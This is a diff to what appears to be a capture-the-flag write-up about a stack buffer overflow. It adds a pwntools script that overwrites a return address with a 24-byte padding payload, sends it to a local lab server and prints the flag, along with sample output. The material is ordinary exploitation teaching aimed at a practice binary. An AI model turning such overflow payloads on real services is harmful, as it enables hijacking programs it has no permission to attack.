@@ -69,12 +69,39 @@ We can test this locally by piping it directly into the binary
 
 ```bash
 python exploit.py | ./server
+# ...
+The Flag is: TH{test_flag}
+# ...
 ```
 
-To do this remotely we f.E. use it in conjunction with `ncat`
+To do this remotely we f.E. use it in conjunction with `pwntools`
+
+```py
+from pwn import *
+
+return_address = b"\x40\x11\x67"[::-1]
+payload = b"A"*24 + return_address
+
+# Define the host and port to connect to
+host = "127.0.0.1"
+port = 1337
+
+# s = remote(host, port, ssl=True) # need this if socket is ssl based
+s = remote(host, port)
+
+s.send(payload)
+print(s.recvline_containsS("Flag"))
+```
+
+Note the `ssl=True` addition if our socket is SSL based.
 
 ```bash
-python exploit.py | ncat 1.2.3.4 1337
+python exploit.py
+# ...
+[+] Opening connection
+The Flag is: TH{test_flag}
+[*] Closed connection
+# ...
 ```
 
 This should get us access and print the flag.
